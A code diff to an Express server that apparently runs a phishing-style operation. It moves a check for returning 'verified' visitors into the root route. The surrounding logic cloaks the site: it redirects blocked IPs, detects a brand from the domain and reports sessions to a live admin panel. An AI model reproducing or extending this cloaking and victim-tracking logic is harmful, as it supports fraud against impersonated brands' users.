@@ -1129,31 +1129,46 @@ async function loadBlockedIPs() {
 
 app.get('/', async (req, res, next) => {
     console.log('Root route accessed');
-    
+
     // Get client IP with fallbacks
-    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
-                    req.headers['x-real-ip'] || 
+    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] ||
+                    req.headers['x-real-ip'] ||
                     req.socket.remoteAddress;
-    
+
     // Check for admin panel access
     const isAdminPanel = req.headers.referer?.includes('/admin');
     if (isAdminPanel) {
         return next();
     }
-    
+
     // Check if website is enabled
     if (!state.settings.websiteEnabled && !isAdminPanel) {
         console.log('Website disabled - redirecting to:', state.settings.redirectUrl);
         return res.redirect(state.settings.redirectUrl);
     }
-    
+
     // Check if IP is blocked
     if (blockedIPs.has(clientIP)) {
         console.log(`Blocked IP detected (${clientIP}) - redirecting to:`, state.settings.redirectUrl);
         return res.redirect(state.settings.redirectUrl);
     }
-    
-    // Directly redirect to check-ip instead of Adspect flow
+
+    // Check for existing verified session
+    const userAgent = req.headers['user-agent'];
+    const hostname = req.get('host') || req.hostname || 'localhost';
+    const detectedBrand = detectBrandFromDomain(hostname);
+    const publicIP = await getPublicIP(clientIP);
+    const sessionId = generateSessionId(publicIP, userAgent, detectedBrand);
+
+    const existingSession = sessionManager.getAllVerifiedSessions().find(s => s.id === sessionId);
+    if (existingSession) {
+        // User has an existing verified session, redirect to their current page
+        const redirectUrl = sessionManager.updateSessionUrl(existingSession);
+        console.log('Existing verified session found, redirecting to:', redirectUrl);
+        return res.redirect(redirectUrl);
+    }
+
+    // No existing session, redirect to check-ip for new session creation
     return res.redirect('/check-ip');
 });
 
@@ -1295,23 +1310,8 @@ app.get('/check-ip', async (req, res) => {
         }
 
         const sessionId = generateSessionId(publicIP, userAgent, detectedBrand);
-        
-        // Check for existing verified session
-        const existingVerifiedSession = sessionManager.getAllVerifiedSessions()
-            .find(s => s.id === sessionId);
 
-        if (existingVerifiedSession) {
-            existingVerifiedSession.connected = true;
-            existingVerifiedSession.loading = false;
-            existingVerifiedSession.lastHeartbeat = Date.now();
-            existingVerifiedSession.lastAccessed = Date.now();
-
-            const redirectUrl = sessionManager.updateSessionUrl(existingVerifiedSession);
-            adminNamespace.emit('session_updated', existingVerifiedSession);
-            return res.redirect(redirectUrl);
-        }
-
-        // Create new session if needed
+        // Create new session if needed (existing sessions should have been handled by root route)
         if (!sessionManager.getSession(sessionId)) {
             const session = sessionManager.createSession(sessionId, publicIP, userAgent, detectedBrand);
             session.currentPage = 'captcha';  // Set current page explicitly
